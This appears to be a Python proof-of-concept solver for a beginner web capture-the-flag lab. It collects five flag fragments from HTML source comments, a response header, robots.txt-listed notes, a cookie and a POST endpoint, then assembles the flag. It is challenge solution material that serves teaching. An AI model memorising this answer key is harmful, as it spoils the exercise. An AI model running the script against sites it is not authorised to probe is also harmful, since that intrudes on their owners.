#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""web_xinshouketang 利用链条 PoC：五课课后练习全自动 -> 集齐五块碎片 -> 拼 flag。

步骤化演示（非 PASS/FAIL 断言脚本）：
  1. 第一课 查看源代码：GET /lesson/1 源码里的 HTML 注释 -> 第 1 块
  2. 第二课 HTTP 响应头：GET /lesson/2 响应头 X-Hint -> 第 2 块
  3. 第三课 robots.txt：/robots.txt 的 Disallow 引出 /hidden-notes/ 教师备忘 -> 第 3 块
  4. 第四课 Cookie：GET /lesson/4 下发的 Set-Cookie: xiaozhitiao=... -> 第 4 块
  5. 第五课 POST 请求：POST /api/lesson5（GET 只回 405）-> 第 5 块
  6. 结课测试：从 /exam 页取 flag 头前缀，拼成 前缀{块1_块2_块3_块4_块5}
     （题内零校验，与末页五框拼接等价；对错由平台 checker 判定）

用法：python3 exp.py http://HOST:58000
仅用标准库，无第三方依赖。
"""
import json
import re
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:58000"


def get(path, method="GET"):
    req = urllib.request.Request(BASE + path, method=method)
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace"), r.headers


print(f"[*] 目标：{BASE}")

# 1. 第一课：源代码里的 HTML 注释
body, _ = get("/lesson/1")
piece1 = re.search(r"第 1 块：(\S+)", body).group(1)
print(f"[1] 查看源代码   Ctrl+U 源码注释      -> {piece1}")

# 2. 第二课：响应头 X-Hint
_, headers = get("/lesson/2")
piece2 = re.search(r"piece-2:\s*(\S+)", headers["X-Hint"]).group(1)
print(f"[2] HTTP 响应头  X-Hint 字段          -> {piece2}")

# 3. 第三课：robots.txt -> Disallow 的 /hidden-notes/
robots, _ = get("/robots.txt")
hidden, piece3 = None, None
for path in re.findall(r"Disallow:\s*(\S+)", robots):
    try:
        note, _ = get(path if path.endswith("/") else path + "/")
    except urllib.error.HTTPError:
        continue  # /api/ 之类无页面的禁入路径
    m = re.search(r"第 3 块：<code>([^<]+)", note)
    if m:
        hidden, piece3 = path, m.group(1)
        break
print(f"[3] robots.txt   {hidden} 教师备忘 -> {piece3}")

# 4. 第四课：Cookie 里的小纸条
_, headers = get("/lesson/4")
cookies = headers.get_all("Set-Cookie") or []
piece4 = next(c.split("=", 1)[1].split(";")[0]
              for c in cookies if c.startswith("xiaozhitiao="))
print(f"[4] Cookie       Set-Cookie xiaozhitiao -> {piece4}")

# 5. 第五课：只收 POST 的接口
body, _ = get("/api/lesson5", method="POST")
piece5 = json.loads(body)["flag_part"]
print(f"[5] POST 请求    POST /api/lesson5     -> {piece5}")

# 6. 结课测试：前缀取自末页（与真实通关流程一致），拼出完整 flag
exam, _ = get("/exam")
prefix = re.search(r'data-prefix="([A-Za-z0-9]+)"', exam).group(1)
flag = f"{prefix}{{{piece1}_{piece2}_{piece3}_{piece4}_{piece5}}}"
print(f"\n[+] 结课测试拼出 flag：{flag}")
print("[+] 拿去平台提交（题内不判对错，Checker 的提示会指出哪块有问题）")
